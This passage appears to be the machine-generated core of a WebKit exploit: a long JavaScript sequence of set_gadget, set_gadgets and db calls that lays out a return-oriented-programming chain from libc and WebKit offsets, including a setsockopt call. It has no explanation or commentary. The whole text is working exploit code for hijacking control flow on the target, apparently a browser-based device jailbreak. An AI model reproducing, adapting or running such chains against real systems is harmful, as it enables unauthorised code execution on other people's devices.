db([4294967024, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+292824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+287728, 
libc_base+811575, 
ropchain+275472, 
libc_base+793877, 
ropchain+292952, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967032, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+293040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+293056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+293208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+293192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+293224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+293336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+293320, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([65535, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+293448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+293592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+293576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+293728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293744, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+293712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+293840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293856, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+293968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+293952, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+294056, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+294040, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+294152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+294168, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+294280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+294264, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+295608, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+295680, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+295744, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967168, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+191168, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967176, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+793877, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+295944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967168, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+296024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+296080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+296160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([13, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+296264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+296280, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+296368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+296424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+296512, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967184, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+792472, 
webkit_base+7438103, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967200, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+793877, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+296680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([7, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+296784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967208, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967216, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+248252, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967224, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+191168, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967232, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+792472, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967240, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297056, 
webkit_base+7438103, 
libc_base+792472 
]);
db([125, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967248, 4294967295]); 
set_gadgets([
libc_base+792472, 
webkit_base+1838146, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+792472, 
webkit_base+11349202, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+792472, 
libc_base+811575, 
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297320, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+793877, 
ropchain+297392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967286, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+297496, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967168, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297560, 
webkit_base+7438103, 
libc_base+788575, 
ropchain+297688, 
webkit_base+11924577 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+297664, 
webkit_base+7438103, 
webkit_base+2810902, 
libc_base+793877, 
ropchain+297680, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+297776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967286, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+297880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+297912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+297896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+298072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+298040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+298024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+298128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+298232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+298264, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+298424, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+298376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+298496, 
webkit_base+7438103, 
libc_base+792472 
]);
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+298656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+298688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+298640, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+298848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+298800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+298952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+298936, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+299048, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+299136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+299152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+299256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+299240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+299360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+299344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+562536, 
libc_base+793877, 
ropchain+299416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+299512, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967286, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+299592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+299648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+792472,); 
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+299800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+299856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+299976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+300008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+299992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+300152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+300120, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+300136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+300248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+300336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+300352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+300456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+300440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+300512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300640, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+300624, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+300752, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+300848, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+300936, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+301000, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+301072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+301224, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+301208, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+301288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+301352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+301440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+301456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+301600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+301568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+301584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+301680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([128, 0]); 
set_gadget(libc_base+788575,); 
db([128, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+301808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+301792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+301936, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+302088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302104, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+302072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+302224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+302376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302392, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+302360, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+302496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302512, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
